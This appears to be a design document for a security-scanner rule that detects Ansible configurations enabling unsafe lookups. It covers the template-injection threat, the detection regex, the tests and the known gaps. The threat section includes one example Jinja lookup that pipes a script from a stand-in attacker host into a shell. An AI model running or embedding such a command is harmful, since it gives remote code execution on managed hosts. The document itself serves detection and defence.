---
type: Guard
title: "ansible-unsafe-lookups-enabled"
description: "ALLOW_UNSAFE_LOOKUPS enabled — lookup-plugin RCE bypass."
timestamp: "2026-07-13T22:41:49+08:00"
guard_id: "ansible-unsafe-lookups-enabled"
checklist_section: ["3a"]
standards: ["OWASP:A03"]
---

# ALLOW_UNSAFE_LOOKUPS enabled — lookup-plugin RCE bypass

_Author — 2026-07-13_

---

## The threat

`ALLOW_UNSAFE_LOOKUPS = True` (or `allow_unsafe_lookups: true`) disables Ansible's
default protection that strips the `!unsafe` marker from a lookup plugin's return
value. Once disabled, an attacker-controlled external source read by
`lookup('file', ...)`, `lookup('url', ...)`, `lookup('pipe', ...)`,
`lookup('hashi_vault', ...)`, or any custom lookup plugin can return a Jinja
expression that Ansible's template engine will then RE-EVALUATE:
`{{ lookup('pipe', 'curl evil.example.com/x.sh | sh') }}` becomes a
template-injection-to-RCE chain. CWE-94 (Code Injection), CWE-1336 (Improper
Neutralization of Special Elements Used in a Template Engine), OWASP:A03.

## Why this guard fits the stack

Fourth guard in agentsec's Ansible coverage (see
`ansible-no-log-disabled-on-secret-task.md` for the shared `ansible`
stack-detection prerequisite). Sourced from `cpeoples/ansible-security-scanner`'s
`ansible_hygiene.yml` rule `allow_unsafe_lookups_enabled`, verified against real
fetched source. This maps naturally to agentsec's existing General Input Safety
section (§3a) alongside the framework's other injection-class guards.

## Detection design

1. `applies()` gates on `"ansible" in profile.features`.
2. Scans `.yml`/`.yaml` files AND `ansible.cfg` by name (`iter_files_named`) — the
   same setting can appear in either YAML (`vars:`/role `defaults/main.yml`) or the
   INI-format `ansible.cfg`. Skips non-product paths.
3. Strips whole-line/trailing `#` comments before matching.
4. A literal regex, anchored at line-start (`(?mi)^\s*`): `ALLOW_UNSAFE_LOOKUPS` or
   `allow_unsafe_lookups` set to a truthy value (`true`/`yes`/`1`, case-insensitive).
5. Fires HIGH, once per file, rule
   `ansible-unsafe-lookups-enabled/global-override`, `["OWASP:A03", "CWE-94",
   "CWE-1336"]`.
6. Inline opt-out: `# security: allow-ansible-unsafe-lookups-enabled`.

## When NOT to flag

Set to a falsy value, or absent entirely (the Ansible default), does not fire.

## Tests

| Test | What it checks |
|---|---|
| `test_flags_yaml_vars_true` | Planted violation: `allow_unsafe_lookups: true` in a vars file — fires |
| `test_flags_ansible_cfg` | Planted violation: `allow_unsafe_lookups = True` in `ansible.cfg` (INI) — fires |
| `test_silent_when_false_or_absent` | FP-bait: set to `false` — silent |
| `test_silent_on_comment_mentioning_pattern` | FP-bait: a doc comment describing the anti-pattern — silent |
| `test_pragma_suppresses` | Inline pragma silences the file |
| `test_not_applies_without_ansible_feature` | `applies()` is `False` without the `ansible` feature |
| `test_nonproduct_path_skipped` | A file under `examples/` is skipped |

## Known bypasses

`ansible.cfg`'s INI format also supports `;`-prefixed comments — `strip_hash_comments`
only strips `#`-style comments, so a `;`-commented mention of the setting would not
be recognized as a comment and could false-positive. Not observed in practice
(ansible.cfg files in the wild predominantly use `#`), documented as a known gap
rather than silently accepted.

## What this guard does NOT prove

Absence of a finding does not prove no lookup plugin can ever return an unsafely
rendered value — a per-call `| from_yaml`-style opt-in bypass, or a custom lookup
plugin implemented to ignore the `!unsafe` marker entirely, is outside this guard's
scanned surface.

# Citations

[1] agentsec checklist item `3a-ansible-unsafe-lookups-enabled` (§3a)
[2] OWASP:A03
